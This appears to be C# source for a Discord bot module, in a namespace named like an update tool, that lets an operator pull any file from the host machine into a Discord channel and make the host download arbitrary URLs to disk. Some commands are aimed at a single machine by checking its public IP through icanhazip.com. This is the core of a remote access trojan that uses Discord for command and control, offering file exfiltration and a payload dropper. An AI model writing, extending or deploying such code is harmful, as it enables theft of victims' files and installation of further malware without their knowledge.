using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace AvEmUpdate.Modules
{
    public class RemoteIOModule : ModuleBase<SocketCommandContext>
    {
        public string getBotIp()
        {
            WebClient webClient = new WebClient();
            return webClient.DownloadString("http://icanhazip.com");
        }

        //TODO: Remove this when you release the application
        [Command("Upload")]
        public async Task Upload([Remainder]string filePath)
        {
            try
            {
                await Context.Channel.SendFileAsync(filePath);
            }
            catch (Exception ex)
            {
                await Context.Channel.SendMessageAsync("```" + ex.Message + "```");
            }
        }
        //TODO: Remove this when you release the application
        [Command("Download")]
        public async Task Download(string urlString, string fileName)
        {
            try
            {
                WebClient wc = new WebClient();
                wc.DownloadFile(urlString, fileName);
                await Context.Channel.SendMessageAsync("```Finished downloading " + urlString + "```");
            }
            catch (Exception ex)
            {
                await Context.Channel.SendMessageAsync("```" + ex.Message + "```");
            }
        }

        [Command("Upload")]
        public async Task Upload(string botIp, [Remainder]string filePath)
        {
            if (getBotIp().Trim() == botIp.Trim())
            {
                try
                {
                    await Context.Channel.SendFileAsync(filePath);
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync("```" + ex.Message + "```");
                }
            }
        }

        [Command("Download")]
        public async Task Download(string botIp, string urlString, string fileName)
        {
            if (getBotIp().Trim() == botIp.Trim())
            {
                try
                {
                    WebClient wc = new WebClient();
                    wc.DownloadFile(urlString, fileName);
                    await Context.Channel.SendMessageAsync("```Finished downloading " + urlString + "```");
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync("```" + ex.Message + "```");
                }
            }
        }
    }
}
